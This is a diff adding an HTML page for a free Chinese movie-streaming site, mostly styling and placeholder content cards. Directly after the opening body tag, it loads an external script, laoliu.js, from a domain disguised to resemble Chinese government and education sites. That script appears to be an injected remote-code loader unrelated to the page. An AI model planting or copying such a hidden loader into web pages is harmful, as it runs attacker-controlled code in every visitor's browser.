@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>大地电影网 - 高清影视在线观看</title>
+<meta name="description" content="大地电影网提供最新电影、电视剧、综艺、动漫在线观看，资源丰富，更新及时，免费高清。">
+<meta name="keywords" content="大地电影网,电影,电视剧,综艺,动漫,在线观看">
+<style>
+/* ===== 全局重置 ===== */
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    background: #0f0f1a;
+    color: #e0e0e0;
+    line-height: 1.6;
+}
+
+/* ===== 头部 ===== */
+.header {
+    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+    padding: 1rem;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    border-bottom: 1px solid #0f3460;
+}
+.header-inner {
+    max-width: 1200px;
+    margin: 0 auto;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+}
+.logo {
+    font-size: 1.5rem;
+    font-weight: 700;
+    color: #e94560;
+    text-decoration: none;
+}
+.logo span { color: #fff; }
+.nav {
+    display: flex;
+    gap: 0.8rem;
+    flex-wrap: wrap;
+}
+.nav a {
+    color: #ccc;
+    text-decoration: none;
+    padding: 0.4rem 0.8rem;
+    border-radius: 4px;
+    transition: all 0.3s;
+    font-size: 0.9rem;
+}
+.nav a:hover { background: #e94560; color: #fff; }
+
+/* ===== Hero ===== */
+.hero {
+    background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 400"><rect fill="%231a1a2e" width="1200" height="400"/><circle cx="200" cy="200" r="150" fill="%23e94560" opacity="0.1"/><circle cx="800" cy="150" r="100" fill="%230f3460" opacity="0.2"/></svg>') center/cover;
+    padding: 4rem 1rem;
+    text-align: center;
+}
+.hero h1 {
+    font-size: 2rem;
+    margin-bottom: 1rem;
+    color: #fff;
+}
+.hero p {
+    color: #aaa;
+    max-width: 600px;
+    margin: 0 auto 2rem;
+}
+.btn {
+    display: inline-block;
+    background: #e94560;
+    color: #fff;
+    padding: 0.8rem 2rem;
+    border-radius: 30px;
+    text-decoration: none;
+    transition: transform 0.3s;
+}
+.btn:hover { transform: translateY(-3px); }
+
+/* ===== 通用容器 ===== */
+.container {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 3rem 1rem;
+}
+
+/* ===== 栏目通用标题 ===== */
+.section-title {
+    font-size: 1.8rem;
+    margin-bottom: 2rem;
+    color: #e94560;
+    text-align: center;
+    position: relative;
+}
+.section-title::after {
+    content: '';
+    width: 60px;
+    height: 3px;
+    background: #e94560;
+    position: absolute;
+    bottom: -10px;
+    left: 50%;
+    transform: translateX(-50%);
+}
+
+/* ===== 电影栏目 - 网格卡片 ===== */
+.movies-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+    gap: 1.5rem;
+}
+.movie-card {
+    background: #16213e;
+    border-radius: 8px;
+    overflow: hidden;
+    transition: transform 0.3s;
+}
+.movie-card:hover { transform: translateY(-5px); }
+.movie-poster {
+    width: 100%;
+    height: 220px;
+    background: linear-gradient(45deg, #0f3460, #e94560);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #fff;
+    font-size: 3rem;
+}
+.movie-info { padding: 1rem; }
+.movie-title { font-size: 0.95rem; margin-bottom: 0.5rem; }
+.movie-meta { font-size: 0.8rem; color: #888; }
+
+/* ===== 剧集栏目 - 列表样式 ===== */
+.series-list {
+    display: flex;
+    flex-direction: column;
+    gap: 1rem;
+}
+.series-item {
+    display: flex;
+    background: #16213e;
+    border-radius: 8px;
+    overflow: hidden;
+}
+.series-thumb {
+    width: 120px;
+    min-height: 80px;
+    background: linear-gradient(135deg, #53354a, #e94560);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #fff;
+    font-size: 2rem;
+    flex-shrink: 0;
+}
+.series-content { padding: 1rem; flex: 1; }
+.series-title { font-size: 1rem; margin-bottom: 0.5rem; }
+.series-desc { font-size: 0.85rem; color: #aaa; }
+
+/* ===== 综艺栏目 - 横向滚动 ===== */
+.show-scroll {
+    display: flex;
+    gap: 1rem;
+    overflow-x: auto;
+    padding-bottom: 1rem;
+}
+.show-scroll::-webkit-scrollbar { height: 6px; }
+.show-scroll::-webkit-scrollbar-thumb { background: #e94560; border-radius: 3px; }
+.show-card {
+    min-width: 200px;
+    background: #16213e;
+    border-radius: 8px;
+    overflow: hidden;
+    flex-shrink: 0;
+}
+.show-img {
+    height: 120px;
+    background: linear-gradient(60deg, #0f3460, #53354a);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #fff;
+    font-size: 2.5rem;
+}
+.show-info { padding: 0.8rem; }
+.show-title { font-size: 0.9rem; }
+
+/* ===== 动漫栏目 - 瀑布流 ===== */
+.anime-masonry {
+    column-count: 2;
+    column-gap: 1rem;
+}
+.anime-item {
+    break-inside: avoid;
+    background: #16213e;
+    border-radius: 8px;
+    margin-bottom: 1rem;
+    overflow: hidden;
+}
+.anime-cover {
+    height: 140px;
+    background: linear-gradient(20deg, #e94560, #0f3460);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #fff;
+    font-size: 2rem;
+}
+.anime-text { padding: 0.8rem; font-size: 0.85rem; }
+
+/* ===== 关于栏目 - 居中卡片 ===== */
+.about-wrap {
+    max-width: 700px;
+    margin: 0 auto;
+    text-align: center;
+}
+.about-card {
+    background: #16213e;
+    padding: 2rem;
+    border-radius: 12px;
+    border: 1px solid #0f3460;
+}
+.about-card h3 { color: #e94560; margin-bottom: 1rem; }
+.about-card p { color: #aaa; margin-bottom: 1.5rem; }
+
+/* ===== 底部 ===== */
+.footer {
+    background: #0a0a1a;
+    padding: 2rem 1rem;
+    text-align: center;
+    border-top: 1px solid #0f3460;
+}
+.footer p { color: #666; font-size: 0.85rem; margin-bottom: 0.5rem; }
+
+/* ===== 响应式 ===== */
+@media (max-width: 768px) {
+    .hero h1 { font-size: 1.5rem; }
+    .nav { gap: 0.4rem; }
+    .nav a { padding: 0.3rem 0.6rem; font-size: 0.8rem; }
+    .series-item { flex-direction: column; }
+    .series-thumb { width: 100%; height: 120px; }
+    .anime-masonry { column-count: 1; }
+    .movies-grid { grid-template-columns: repeat(2, 1fr); }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 头部 -->
+<header class="header">
+    <div class="header-inner">
+        <a href="#" class="logo">大地<span>电影网</span></a>
+        <nav class="nav">
+            <a href="#">首页</a>
+            <a href="#">电影</a>
+            <a href="#">剧集</a>
+            <a href="#">综艺</a>
+            <a href="#">动漫</a>
+            <a href="#">关于</a>
+        </nav>
+    </div>
+</header>
+
+<!-- Hero -->
+<section class="hero">
+    <h1>大地电影网</h1>
+    <p>最新电影、热播剧集、精彩综艺、经典动漫，一站看完</p>
+    <a href="#" class="btn">立即观看</a>
+</section>
+
+<!-- 电影 -->
+<section class="container" id="movies">
+    <h2 class="section-title">🎬 电影推荐</h2>
+    <div class="movies-grid">
+        <div class="movie-card"><div class="movie-poster">🎞️</div><div class="movie-info"><div class="movie-title">电影名称</div><div class="movie-meta">2024 · 动作</div></div></div>
+        <div class="movie-card"><div class="movie-poster">🎬</div><div class="movie-info"><div class="movie-title">电影名称</div><div class="movie-meta">2024 · 爱情</div></div></div>
+        <div class="movie-card"><div class="movie-poster">📽️</div><div class="movie-info"><div class="movie-title">电影名称</div><div class="movie-meta">2024 · 科幻</div></div></div>
+        <div class="movie-card"><div class="movie-poster">🎥</div><div class="movie-info"><div class="movie-title">电影名称</div><div class="movie-meta">2024 · 悬疑</div></div></div>
+    </div>
+</section>
+
+<!-- 剧集 -->
+<section class="container" id="series">
+    <h2 class="section-title">📺 热播剧集</h2>
+    <div class="series-list">
+        <div class="series-item"><div class="series-thumb">📺</div><div class="series-content"><div class="series-title">剧集标题</div><div class="series-desc">精彩剧情简介，扣人心弦的故事发展，不容错过。</div></div></div>
+        <div class="series-item"><div class="series-thumb">🎭</div><div class="series-content"><div class="series-title">剧集标题</div><div class="series-desc">年度大剧，全员演技在线，口碑爆棚。</div></div></div>
+        <div class="series-item"><div class="series-thumb">🎪</div><div class="series-content"><div class="series-title">剧集标题</div><div class="series-desc">古装传奇，制作精良，视觉震撼。</div></div></div>
+    </div>
+</section>
+
+<!-- 综艺 -->
+<section class="container" id="shows">
+    <h2 class="section-title">🎤 综艺娱乐</h2>
+    <div class="show-scroll">
+        <div class="show-card"><div class="show-img">🎤</div><div class="show-info"><div class="show-title">综艺节目</div></div></div>
+        <div class="show-card"><div class="show-img">🎧</div><div class="show-info"><div class="show-title">综艺节目</div></div></div>
+        <div class="show-card"><div class="show-img">🎪</div><div class="show-info"><div class="show-title">综艺节目</div></div></div>
+        <div class="show-card"><div class="show-img">🎨</div><div class="show-info"><div class="show-title">综艺节目</div></div></div>
+        <div class="show-card"><div class="show-img">🎯</div><div class="show-info"><div class="show-title">综艺节目</div></div></div>
+    </div>
+</section>
+
+<!-- 动漫 -->
+<section class="container" id="anime">
+    <h2 class="section-title">🌸 动漫天地</h2>
+    <div class="anime-masonry">
+        <div class="anime-item"><div class="anime-cover">🌸</div><div class="anime-text">动漫推荐简介文字内容</div></div>
+        <div class="anime-item"><div class="anime-cover">🔥</div><div class="anime-text">热门动漫更新中，精彩不断</div></div>
+        <div class="anime-item"><div class="anime-cover">⚡</div><div class="anime-text">经典重温，回忆杀来袭</div></div>
+        <div class="anime-item"><div class="anime-cover">🌟</div><div class="anime-text">新番速递，第一时间观看</div></div>
+    </div>
+</section>
+
+<!-- 关于 -->
+<section class="container" id="about">
+    <h2 class="section-title">ℹ️ 关于本站</h2>
+    <div class="about-wrap">
+        <div class="about-card">
+            <h3>大地电影网</h3>
+            <p>致力于为用户提供优质的影视资源聚合服务，涵盖电影、电视剧、综艺、动漫等多个分类，每日更新，免费观看。</p>
+            <p>网址：https://dadidianyingwang-h5.github.io</p>
+            <a href="#" class="btn">收藏本站</a>
+        </div>
+    </div>
+</section>
+
+<!-- 底部 -->
+<footer class="footer">
+    <p>© 2024 大地电影网 | 网址：https://dadidianyingwang-h5.github.io</p>
+    <p>免责声明：本站仅提供影视信息索引服务，资源来自互联网，如有侵权请联系删除。</p>
+</footer>
+
+</body>
+</html>
